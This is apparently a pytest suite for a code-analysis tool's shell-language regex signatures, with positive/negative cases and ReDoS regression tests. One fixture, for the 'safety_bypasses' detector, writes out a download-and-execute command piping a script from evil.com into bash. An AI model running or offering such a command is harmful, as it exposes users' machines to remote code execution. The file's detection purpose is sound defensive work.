"""shell strict structural-signature coverage.

Migrated out of tests/core_engine/test_language_standards_strict.py, then
colocated here in tests/extraction/languages/ alongside the extraction
gauntlets' own test_<lang>.py files (the `_strict` suffix on this filename
avoids a basename collision between the two under pytest's default import
mode). See tests/core_engine/test_language_standards_strict.py's git history
for the original single-file layout and section banners (Issue references, etc).
"""

import sys
from pathlib import Path

import pytest

from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

_LANGUAGES_DIR = str(Path(__file__).resolve().parent)
if _LANGUAGES_DIR not in sys.path:
    sys.path.insert(0, _LANGUAGES_DIR)

from _strict_harness import assert_redos_immune  # noqa: E402 # type: ignore


# NOTE: this test was originally grouped under a shared "cross-language sweep"
# section in tests/core_engine/test_language_standards_strict.py (before that file
# was split into tests/extraction/languages/, one file per language) alongside
# equivalent regressions for several other languages, all fixing the same bug
# *shape* found by one systematic sweep. Shared context below, duplicated into
# every language file that sweep touched -- see git history for the original,
# single copy.
# ==============================================================================
# CROSS-LANGUAGE REDOS SWEEP: "BARE IDENTIFIER BEFORE ARROW" FAMILY
# ==============================================================================
# All found by a systematic ReDoS sweep across every language's compiled
# patterns (not just the ones with an existing historical-bug comment):
# an unbounded identifier/word-run quantifier with no preceding \b anchor,
# immediately followed by a required-but-often-absent literal suffix
# (=>, ->, __c.getInstance, etc.). Because the leading character class has
# no boundary anchor, the engine retries the greedy-then-backtrack match at
# EVERY position in a long run of matching characters -- O(n^2) total, not
# exponential, but still a real DoS risk on a single pathologically long
# line (e.g. minified/obfuscated code). All bounded with numeric clamps
# instead of possessive quantifiers (`*+`), since those aren't available
# until Python 3.11 and this package supports 3.9+.


def test_shell_state_mutation_arithmetic_redos_immunity():
    pattern = LANGUAGE_DEFINITIONS["shell"]["rules"]["state_mutation"]
    assert_redos_immune(pattern, "(" * 40000, timeout_sec=3.0)
    assert pattern.search("((i++))")


# ==============================================================================
# SHELL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #610)
# ==============================================================================
SHELL_RULES = LANGUAGE_DEFINITIONS["shell"]["rules"]

_SHELL_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    # --- PHASE 1 ---
    ("branch", "if [[ $x -gt 5 ]]; then", "x=5"),
    ("args", 'echo "$1"', "echo hello"),
    ("structural_boundaries", "local x=1", "echo hello"),
    ("func_start", "function deploy() {", "if [ -f x ]; then"),
    # --- PHASE 2 ---
    ("safety", "trap 'cleanup' EXIT", "echo hello"),
    (
        "safety_bypasses",
        "curl https://evil.com/install.sh | bash",
        "curl https://example.com/data.json -o data.json",
    ),
    ("high_risk_execution", "rm -rf /tmp/build", "rm file.txt"),
    ("io", "curl -O https://example.com/file", "echo done"),
    ("api", "export MY_VAR=1", "local MY_VAR=1"),
    ("state_mutation", "x=5", "echo x"),
    ("dead_code", "# rm -rf /tmp", "# just a note"),
    ("doc", "# Usage: script.sh [options]", "# just a note"),
    ("test", "assertTrue $result", "echo hello"),
    # --- PHASE 3 ---
    ("concurrency", "long_running_task &", "x=1"),
    ("ui_framework", "dialog --msgbox 'hi' 10 30", "echo hi"),
    ("globals", "echo $HOME", "echo $myvar"),
    ("comprehensions", "for i in {1..10}; do", "for i in 1 2 3; do"),
    ("scientific", "result=$(( 1 + 2 ))", "result=1"),
    ("reflection_metaprogramming", "output=$(date)", "output=static"),
    ("import", "source ./lib.sh", "echo lib.sh"),
    ("ownership", "# Author: Jane Doe", "# just a note"),
    # --- PHASE 4 ---
    ("planned_debt", "# TODO: refactor", "# done"),
    ("fragile_debt", "# HACK: workaround", "# clean"),
    ("spec_exposure", "# [SPEC-123] audit tag", "# just a note"),
    ("ssr_boundaries", 'echo "Content-type: text/html"', "echo hello"),
    ("events", "mkfifo /tmp/pipe", "echo pipe"),
    ("dependency_injection", "command -v git", "echo git"),
    ("macros", "alias ll='ls -la'", "ll='ls -la'"),
    ("pointers", "declare -n ref=x", "declare x=1"),
    # --- PHASE 5 ---
    ("telemetry", "logger 'message'", "true"),
    ("debug_prints", "echo 'debug info'", "true"),
    ("panics_and_aborts", "abort", "echo done"),
    ("thread_sleeps", "sleep 5", "date"),
    ("sync_locks", "flock /tmp/lock", "echo lock"),
    ("immutability_locks", "readonly CONST=1", "local CONST=1"),
    ("cleanup", "rm -f /tmp/file", "ls /tmp/file"),
    ("encapsulation", "local x=1", "export x=1"),
    ("listeners", "nc -l 8080", "nc example.com 80"),
    ("test_skip", "# SKIP: flaky test", "# run test"),
    # --- HYBRID ---
    ("serialization_parsing", "yq eval '.foo' file.yaml", "cat file.yaml"),
    ("regex_execution", "[[ $x =~ ^[0-9]+$ ]]", "[[ $x == 'foo' ]]"),
    ("time_date_logic", "date +%Y-%m-%d", "echo today"),
    ("ipc_rpc_bridges", "ssh user@host 'ls'", "echo host"),
]


@pytest.mark.parametrize("signature,positive,negative", _SHELL_SIMPLE_CASES)
def test_shell_signature_positive_and_negative(signature, positive, negative):
    pattern = SHELL_RULES[signature]
    assert pattern is not None, f"shell's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"shell {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"shell {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_shell_dependency_capture_extracts_sourced_path():
    """
    `_dependency_capture` is the capture-group sibling of `import`, used by
    the Network Graph / Supply Chain Firewall to extract the exact sourced
    path rather than just detecting presence.
    """
    pattern = SHELL_RULES["_dependency_capture"]
    m = pattern.search("source ./lib/helpers.sh")
    assert m and m.group(1) == "./lib/helpers.sh"
    m2 = pattern.search(". ./lib/helpers.sh")
    assert m2 and m2.group(1) == "./lib/helpers.sh"
    m3 = pattern.search("if [ -f .env ]; then source .env; fi")
    assert m3 and m3.group(1) == ".env"


def test_shell_dead_code_single_comment_style_confirmed_no_second_style():
    """
    Comment-style audit (Rule 12): shell's lexical_family is `line_exclusive`
    -- it has no native block-comment syntax, only `#`. Unlike a
    `standard_block` language (which must wire `dead_code` to both `//` and
    `/* */`), there is no second comment style to audit here. This test
    documents that the check was performed, not skipped: `dead_code` fires
    on the single `#` style and there is no equivalent block-comment form
    for it to silently miss.
    """
    pattern = SHELL_RULES["dead_code"]
    assert pattern.search("# rm -rf /tmp/cache")
    assert pattern.search("    # echo debug")


def test_shell_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: because shell is `line_exclusive` (no block
    comment delimiters), none of its structural regexes track open/close
    block-comment state, so there is no "stray closing token inside a
    heredoc/string" failure mode to exploit for comment stripping the way a
    `standard_block`/`recursive_block` language's `/* ... */` tracker could
    be fooled. Every shell rule that recognizes a keyword like `fi`/`done`/
    `esac` (branch) does so via flat keyword-presence matching, not
    depth-tracking, so its behavior on a keyword sitting inside a heredoc
    body is identical to its behavior anywhere else in the executable
    payload -- there is nothing for a stray `}`/`fi` to falsely "close".
    The one place shell rules DO track a nesting depth is delimiter
    matching for `$(...)`, `<(...)`/`>(...)`, and `${...}` (safety,
    concurrency, reflection_metaprogramming) -- covered by the dedicated
    nested-delimiter regression tests below, not by comment-state tracking.
    """
    branch = SHELL_RULES["branch"]
    heredoc_body_with_fi = "cat <<EOF\nif true; then\n  echo hi\nfi\nEOF\n"
    assert branch.search(heredoc_body_with_fi), (
        "branch should still see 'if'/'fi' inside a heredoc body -- there is no "
        "block-state tracker for it to be fooled by in the first place"
    )


def test_shell_structural_boundaries_dot_source_leading_boundary_regression():
    """
    Regression test: the dot-source operator (`.`) is a non-word character,
    so it could never satisfy a shared leading `\\b` -- the exact same trap
    already documented (and fixed) on `_dependency_capture`/`import` above.
    Before the fix, `.` sat inside the big `\\b(local|...|\\.|...)\\b`
    alternation, so `. ./configfile` (the only realistic way dot-sourcing is
    written -- always preceded by whitespace or line start, both non-word)
    never matched at all. Confirmed empirically: the old pattern only
    "matched" by accident when a `.` happened to appear elsewhere in the
    line preceded by a word character (e.g. the extension dot in
    `foo.sh`), never the actual dot-source token itself.
    """
    pattern = SHELL_RULES["structural_boundaries"]
    assert pattern.search(". ./configfile"), "dot-source still didn't match"
    assert pattern.search(". /etc/profile")
    assert pattern.search("  . lib/helpers"), "indented dot-source still didn't match"
    assert pattern.search("source /etc/profile"), "source keyword form regressed"


def test_shell_safety_nested_default_expansion_regression():
    """
    Nested-delimiter regression (Rule 11): both `${...}` clauses in `safety`
    (the quoted and unquoted default-value forms) used a flat `[^}]+`/
    `[^}]*` delimiter matcher, which cannot represent one level of nesting.
    A realistic nested default-value expansion -- e.g.
    `${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}`, a common multi-level fallback
    idiom -- truncated at the first (inner) `}` instead of capturing the
    full expression. Upgraded to the one-level-nesting form from the
    project's Rule 11 playbook.
    """
    pattern = SHELL_RULES["safety"]
    m = pattern.search("${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}")
    assert m and m.group() == "${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}", (
        f"nested default expansion truncated: {m.group() if m else None!r}"
    )
    m2 = pattern.search('"${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}"')
    assert m2 and m2.group() == '"${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}"', (
        f"nested quoted default expansion truncated: {m2.group() if m2 else None!r}"
    )
    assert pattern.search("${VAR:-default}"), "non-nested form regressed"


def test_shell_safety_expansion_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: both `${...}`
    clauses' flat `[^}]+`/`[^}]*` were unbounded and unanchored -- quadratic
    on a long run of unclosed `${` (each opening candidate scans to the end
    of the payload looking for a `}` that never arrives). Confirmed genuine
    O(n^2) scaling (~4x per doubling at n=2k/4k/8k/16k/32k, e.g.
    0.015s/0.06s/0.24s/0.94s/3.5s for the unquoted clause) before being
    upgraded to the one-level-nesting form, which is linear (~2x per
    doubling) because the two alternatives never match overlapping text.
    """
    pattern = SHELL_RULES["safety"]
    assert_redos_immune(pattern, "${x:-" * 20000, timeout_sec=3.0)
    assert_redos_immune(pattern, '"${x' * 20000, timeout_sec=3.0)
    assert pattern.search("${VAR:-default}")


def test_shell_safety_trap_redos_immunity():
    """
    Regression test for a second, independent confirmed real O(n^2) ReDoS
    in the same rule: the trap clause's `[^\\n]*` was unbounded and
    unanchored -- quadratic on a single long line packed with `trap `
    occurrences that never resolve to ERR/EXIT/INT/TERM (each occurrence's
    failed match scans to the end of the line). Confirmed genuine O(n^2)
    scaling (~4x per doubling at n=1k/2k/4k/8k/16k occurrences, e.g.
    0.036s/0.14s/0.57s/2.24s/5.48s) before being bounded to {0,300}; a real
    trap statement resolving within 300 chars is generous.
    """
    pattern = SHELL_RULES["safety"]
    assert_redos_immune(pattern, "trap " * 20000, timeout_sec=3.0)
    assert pattern.search("trap 'cleanup' EXIT")
    assert pattern.search("trap 'echo error' ERR")


def test_shell_concurrency_nested_process_substitution_regression():
    """
    Nested-delimiter regression (Rule 11): `<(...)`/`>(...)` (process
    substitution) used a flat `[^)]*` delimiter matcher, which cannot
    represent one level of nesting. A realistic nested process substitution
    -- e.g. `diff <(sort <(cat a)) <(sort b)`, comparing the sorted output
    of two other process substitutions -- truncated at the first (inner)
    `)` instead of capturing the full outer substitution. Upgraded to the
    one-level-nesting form.
    """
    pattern = SHELL_RULES["concurrency"]
    m = pattern.search("diff <(sort <(cat a)) <(sort b)")
    assert m and m.group() == "<(sort <(cat a))", f"nested process substitution truncated: {m.group() if m else None!r}"
    assert pattern.search("diff <(sort a) <(sort b)"), "non-nested form regressed"


def test_shell_concurrency_process_substitution_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `<(...)`/`>(...)`'s
    flat `[^)]*` was unbounded and unanchored -- quadratic on a long run of
    unclosed `<(` (confirmed ~4x per doubling at n=2k/4k/8k/16k/32k, e.g.
    0.006s/0.024s/0.095s/0.38s/1.5s) before being upgraded to the
    one-level-nesting form, which is linear (~2x per doubling).
    """
    pattern = SHELL_RULES["concurrency"]
    assert_redos_immune(pattern, "<(" * 20000, timeout_sec=3.0)
    assert_redos_immune(pattern, ">(" * 20000, timeout_sec=3.0)
    assert pattern.search("diff <(sort a) <(sort b)")


def test_shell_reflection_metaprogramming_nested_command_substitution_regression():
    """
    Nested-delimiter regression (Rule 11): `$(...)` (command substitution)
    used a flat `[^)]+` delimiter matcher, which cannot represent one level
    of nesting. A realistic nested command substitution -- e.g.
    `DIR=$(cd "$(dirname "$0")" && pwd)`, the canonical "find my own script
    directory" idiom -- truncated at the first (inner) `)` instead of
    capturing the full outer substitution. Upgraded to the one-level-nesting
    form.
    """
    pattern = SHELL_RULES["reflection_metaprogramming"]
    m = pattern.search('DIR=$(cd "$(dirname "$0")" && pwd)')
    assert m and m.group() == '$(cd "$(dirname "$0")" && pwd)', (
        f"nested command substitution truncated: {m.group() if m else None!r}"
    )
    assert pattern.search("echo $(date)"), "non-nested form regressed"


def test_shell_reflection_metaprogramming_command_substitution_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `$(...)`'s flat
    `[^)]+` was unbounded and unanchored -- quadratic on a long run of
    unclosed `$(` (confirmed ~4x per doubling at n=2k/4k/8k/16k/32k, e.g.
    0.006s/0.024s/0.094s/0.38s/1.5s) before being upgraded to the
    one-level-nesting form, which is linear (~2x per doubling).
    """
    pattern = SHELL_RULES["reflection_metaprogramming"]
    assert_redos_immune(pattern, "$(" * 20000, timeout_sec=3.0)
    assert pattern.search("echo $(date)")


def test_shell_spec_exposure_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the trailing
    `[^\\]]*` was unbounded and unanchored -- quadratic on a long run of
    unclosed `#[SPEC-1` tags (confirmed ~4x per doubling at
    n=2k/4k/8k/16k/32k, e.g. 0.048s/0.19s/0.75s/1.83s/7.3s) before being
    bounded to {0,300}; real spec/audit tags don't get remotely that long.
    """
    pattern = SHELL_RULES["spec_exposure"]
    assert_redos_immune(pattern, "#[SPEC-1" * 20000, timeout_sec=3.0)
    assert pattern.search("# [SPEC-123] implement retry logic")
    assert pattern.search("# [audit] verify checksum")


def test_shell_cleanup_trap_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: `cleanup`'s trap
    clause has the same shape as `safety`'s (see
    test_shell_safety_trap_redos_immunity) -- an unbounded `.*` before the
    required `EXIT` literal, unanchored, quadratic on a long run of `trap `
    occurrences that never resolve to EXIT (confirmed ~4x per doubling at
    n=2k/4k/8k/16k/32k, e.g. 0.013s/0.05s/0.20s/0.81s/1.96s) before being
    bounded to {0,300}.
    """
    pattern = SHELL_RULES["cleanup"]
    assert_redos_immune(pattern, "trap " * 20000, timeout_sec=3.0)
    assert pattern.search("trap 'rm -rf $TMPDIR' EXIT")
    assert pattern.search("rm -f /tmp/lockfile")


def test_shell_test_skip_comment_marker_leading_boundary_regression():
    """
    Regression test: `#\\s*SKIP` starts with `#` (non-word), so it could
    never satisfy the shared leading `\\b` -- a real `# SKIP: ...` comment
    is always preceded by whitespace or line start (both non-word), so it
    never matched at all. Pulled out of the group with the leading `\\b`
    dropped (the `#` is self-delimiting), matching the standard remedy for
    this bug class.
    """
    pattern = SHELL_RULES["test_skip"]
    assert pattern.search("# SKIP: flaky test"), "'# SKIP' comment marker still didn't match"
    assert pattern.search("  # SKIP due to CI flakiness")
    assert pattern.search("mock service_response"), "mock keyword form regressed"
    assert not pattern.search("# SKIPPED already handled elsewhere"), (
        "trailing boundary should still exclude 'SKIPPED' as a longer word"
    )


def test_shell_time_date_logic_flag_and_format_trailing_boundary_regression():
    """
    Regression test: the `date\\s+`/`sleep\\s+` alternatives required a
    word character to immediately follow the whitespace to satisfy the
    shared trailing `\\b` -- never true for how `date` is actually invoked
    in real scripts (almost always followed by a `-flag` or `+FORMAT`, both
    non-word). The single most common real-world form, `date +%Y-%m-%d`,
    never matched at all, nor did `date -u`. The trailing `\\s+` was
    redundant to begin with -- `\\b` alone already prevents partial-word
    matches like "update" -- so it was dropped entirely.
    """
    pattern = SHELL_RULES["time_date_logic"]
    assert pattern.search("date +%Y-%m-%d"), "'date +FORMAT' form still didn't match"
    assert pattern.search("date -u"), "'date -u' flag form still didn't match"
    assert pattern.search("sleep 5"), "bare sleep form regressed"
    assert not pattern.search("updated_at=1"), "'update'-shaped word incorrectly matched"


def test_shell_func_start_and_macros_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a preprocessor/macro
    construct fooling func_start, as seen with C++ macros): shell has no
    C-style macros, but `macros` maps to `alias`/`shopt` declarations. These
    require the literal `alias`/`shopt` keyword at line start and never
    produce the `name()`/`function name` shape `func_start` looks for, so
    the two never fire on the same text.
    """
    func_start = SHELL_RULES["func_start"]
    macros = SHELL_RULES["macros"]

    alias_line = "alias ll='ls -la'"
    assert macros.search(alias_line)
    assert not func_start.search(alias_line)

    func_line = "deploy() {"
    assert func_start.search(func_line)
    assert not macros.search(func_line)


def test_shell_test_and_regex_execution_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a `.test(`-style regex
    method miscounted as a test-framework call, as seen in TypeScript):
    verified empirically rather than assumed. Shell's `test` signature is
    scoped to unit-testing framework vocabulary (`assertTrue`, `bats`,
    `shunit2`, `@test`, the bats `run` helper) -- it does NOT include the
    shell builtin `test`/`[`/`[[` construct at all, so it structurally
    cannot collide with `regex_execution`'s `[[ $x =~ $pattern ]]` /
    `grep`/`sed`/`awk` forms. Unlike PowerShell's Pester `Should -Match`
    (a genuine, intentional double-classification), this is not an overlap
    of any kind -- the two signatures simply don't share vocabulary.
    """
    test_ = SHELL_RULES["test"]
    regex_execution = SHELL_RULES["regex_execution"]

    regex_test_construct = "[[ $x =~ ^[0-9]+$ ]]"
    assert regex_execution.search(regex_test_construct)
    assert not test_.search(regex_test_construct)

    unit_test_assertion = "assertTrue $ok"
    assert test_.search(unit_test_assertion)
    assert not regex_execution.search(unit_test_assertion)


def test_shell_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents a representative sample of the automated ambiguity sweep's
    findings for shell -- all confirmed genuine, intentional
    double-classifications via direct empirical verification, not false
    positives:

    - `structural_boundaries` <-> `encapsulation` on `local`/`declare`/
      `typeset`: these keywords are simultaneously a structural boundary
      (a straight-line declaration statement) AND an encapsulation marker
      (they scope a variable to local/function state) -- both are correct.
    - `structural_boundaries` <-> `immutability_locks` on `readonly`/
      `typeset -r`: declaring a variable read-only is simultaneously a
      structural boundary AND an immutability lock.
    - `io` <-> `ipc_rpc_bridges` on `curl`/`ssh`: a network client
      invocation is genuinely both a raw I/O operation AND an inter-process/
      remote-procedure bridge -- correctly double-classified, the same
      pattern already established for `curl`/`ssh` in other languages'
      sections of this file.
    - `safety` <-> `cleanup` on `trap '...' EXIT`: an EXIT trap is
      simultaneously defensive programming (guaranteed cleanup on exit) AND
      a resource-cleanup/teardown construct -- both are correct.
    - `high_risk_execution` <-> `panics_and_aborts` on `kill`: sending a
      signal is genuinely both a high-risk system call AND a
      forceful-execution-interrupt construct.
    """
    structural_boundaries = SHELL_RULES["structural_boundaries"]
    encapsulation = SHELL_RULES["encapsulation"]
    immutability_locks = SHELL_RULES["immutability_locks"]
    io = SHELL_RULES["io"]
    ipc_rpc_bridges = SHELL_RULES["ipc_rpc_bridges"]
    safety = SHELL_RULES["safety"]
    cleanup = SHELL_RULES["cleanup"]
    high_risk_execution = SHELL_RULES["high_risk_execution"]
    panics_and_aborts = SHELL_RULES["panics_and_aborts"]

    local_decl = "local env=$1"
    assert structural_boundaries.search(local_decl)
    assert encapsulation.search(local_decl)

    readonly_decl = "readonly VERSION=1.2.3"
    assert structural_boundaries.search(readonly_decl)
    assert immutability_locks.search(readonly_decl)

    curl_call = "curl -s https://api.example.com/data"
    assert io.search(curl_call)
    assert ipc_rpc_bridges.search(curl_call)

    exit_trap = "trap 'rm -rf $TMPDIR' EXIT"
    assert safety.search(exit_trap)
    assert cleanup.search(exit_trap)

    kill_call = "kill -HUP $pid"
    assert high_risk_execution.search(kill_call)
    assert panics_and_aborts.search(kill_call)
